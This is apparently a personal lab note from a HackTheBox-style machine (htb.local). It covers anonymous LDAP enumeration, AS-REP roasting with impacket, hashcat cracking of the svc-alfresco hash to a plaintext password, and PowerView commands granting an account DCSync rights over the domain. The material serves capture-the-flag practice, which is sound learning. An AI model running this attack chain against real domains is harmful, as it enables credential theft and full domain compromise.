- No webservice or accessible shares (anonymous login) was found

# LDAP Enumeration
---
- **==If Anonymous LDAP Binds Are Allowed==**, we can use `ldapsearch`:
	`ldapsearch -x -H ldap://<DC_IP> -b "dc=domain,dc=com"`
- [[Finding Accounts using LDAP]]
- ![[Pasted image 20250424224316.png]]

# ASREP-Roasting
---
- Having found some users, we can try `ASREP-ROASTING`to get hashes of users with **Kerberos Pre-Auth disabled**:
	- `impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass -format john`
	- ![[Pasted image 20250424224438.png]]
- A service account `svc-alfresco` (seems) hash is found, let's crack it
	- `hashcat svc-alfresco_hash.txt /usr/share/wordlists/rockyou.txt`
	- ![[Pasted image 20250424224536.png]]

	- `svc-alfresco`: `s3rvice`



```
$SecPassword = ConvertTo-SecureString 'password1' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\hacker', $SecPassword)
```

```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```

Add-ObjectACL -PrincipalIdentity hacker -Credential $Cred -Rights DCSync